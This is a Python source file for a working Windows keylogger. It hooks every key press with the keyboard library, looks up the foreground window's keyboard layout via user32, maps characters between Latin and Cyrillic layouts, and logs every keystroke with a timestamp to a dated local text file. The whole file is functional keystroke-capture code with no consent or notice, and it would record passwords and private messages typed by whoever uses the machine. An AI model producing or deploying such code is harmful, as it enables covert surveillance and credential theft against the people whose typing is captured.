import keyboard
import ctypes

import logging
import datetime


today = datetime.datetime.now().strftime('%Y-%m-%d')

logging.basicConfig(filename=(f'keylog_{today}.txt'), level=logging.DEBUG, format="%(asctime)s - %(message)s")

language_codes = {
    '0x409': 'English - United States',
    '0x809': 'English - United Kingdom',
    '0x419': 'Russian',
}

# Latin to Cyrillic keyboard mapping
latin_into_cyrillic = (
                        "`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                        "qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                        "~`{[}]:;\"'|<,>.?/@#$^&",

                        "ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                        "йцукенгшщзхъфывапролджэячсмитьбю." +
                        "ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?"
                    )
# Cyrillic to Latin keyboard mapping
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])

print('ord() explanation', latin_into_cyrillic[0][1], ord(latin_into_cyrillic[0][1]))           # Q -> 81 (ord() returns numeric value for unicode symbol)
print('chr() explanation', ord(latin_into_cyrillic[0][1]), chr(ord(latin_into_cyrillic[0][1]))) # 81 -> Q (chr() is opposite to ord(), it converts numeric code to unicode character)


latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
print('latin_into_cyrillic_trantab', latin_into_cyrillic_trantab) # {96: 1105, 81: 1049, 87: 1062, 69: 1059, 82: 1050, 84: 1045, 89: 1053, 85: 1043, 73: 1064, 79: 1065, 80: 1047, 91: 1093, 93: 1098, 65: 1060, 83: 1067, 68: 1042, 70: 1040, 71: 1055, 72: 1056, 74: 1054, 75: 1051, 76: 1044, 59: 1078, 39: 1101, 90: 1071, 88: 1063, 67: 1057, 86: 1052, 66: 1048, 78: 1058, 77: 1068, 44: 1073, 46: 1102, 47: 46, 113: 1081, 119: 1094, 101: 1091, 114: 1082, 116: 1077, 121: 1085, 117: 1075, 105: 1096, 111: 1097, 112: 1079, 97: 1092, 115: 1099, 100: 1074, 102: 1072, 103: 1087, 104: 1088, 106: 1086, 107: 1083, 108: 1076, 122: 1103, 120: 1095, 99: 1089, 118: 1084, 98: 1080, 110: 1090, 109: 1100, 126: 1025, 123: 1061, 125: 1066, 58: 1046, 34: 1069, 124: 47, 60: 1041, 62: 1070, 63: 44, 64: 34, 35: 8470, 36: 59, 94: 58, 38: 63}

cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])
print('cyrillic_into_latin_trantab', cyrillic_into_latin_trantab) # {1105: 96, 1049: 81, 1062: 87, 1059: 69, 1050: 82, 1045: 84, 1053: 89, 1043: 85, 1064: 73, 1065: 79, 1047: 80, 1061: 123, 1066: 125, 1060: 65, 1067: 83, 1042: 68, 1040: 70, 1055: 71, 1056: 72, 1054: 74, 1051: 75, 1044: 76, 1046: 58, 1069: 34, 1071: 90, 1063: 88, 1057: 67, 1052: 86, 1048: 66, 1058: 78, 1068: 77, 1041: 60, 1070: 62, 46: 47, 1081: 113, 1094: 119, 1091: 101, 1082: 114, 1077: 116, 1085: 121, 1075: 117, 1096: 105, 1097: 111, 1079: 112, 1093: 91, 1098: 93, 1092: 97, 1099: 115, 1074: 100, 1072: 102, 1087: 103, 1088: 104, 1086: 106, 1083: 107, 1076: 108, 1078: 59, 1101: 39, 1103: 122, 1095: 120, 1089: 99, 1084: 118, 1080: 98, 1090: 110, 1100: 109, 1073: 44, 1102: 46, 1025: 126, 47: 124, 44: 63, 34: 64, 8470: 35, 59: 36, 58: 94, 63: 38}

cyrillic_layouts = ['Russian', 'Belarusian', 'Kazakh', 'Ukrainian']


def detect_keyboard_layout_win():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)

    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x409'] # English (US)
    return language


def cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language):
    # cyrillic to latin reverse translation is required
    if ord(key_pressed) in cyrillic_into_latin_trantab:
        key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])

    # latin to cyrillic translation is required
    elif current_keyboard_language in cyrillic_layouts and initial_keyboard_language not in cyrillic_layouts:
        if ord(key_pressed) in latin_into_cyrillic_trantab:
            key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])

    return key_pressed


def keypress_callback(event):
    # print(event)
    key_pressed = event.name

    print('initial_keyboard_language', initial_keyboard_language)

    current_keyboard_language = detect_keyboard_layout_win()
    print('current_keyboard_language', current_keyboard_language)

    if len(key_pressed) == 1:
        if 'English' in current_keyboard_language and 'English' not in initial_keyboard_language:
            key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)

        if 'Russian' in current_keyboard_language and 'Russian' not in initial_keyboard_language:
            key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)

    # write to log
    logging.info(str(key_pressed))
    print(key_pressed)


initial_keyboard_language = detect_keyboard_layout_win()

keyboard.on_press(keypress_callback)
keyboard.wait()
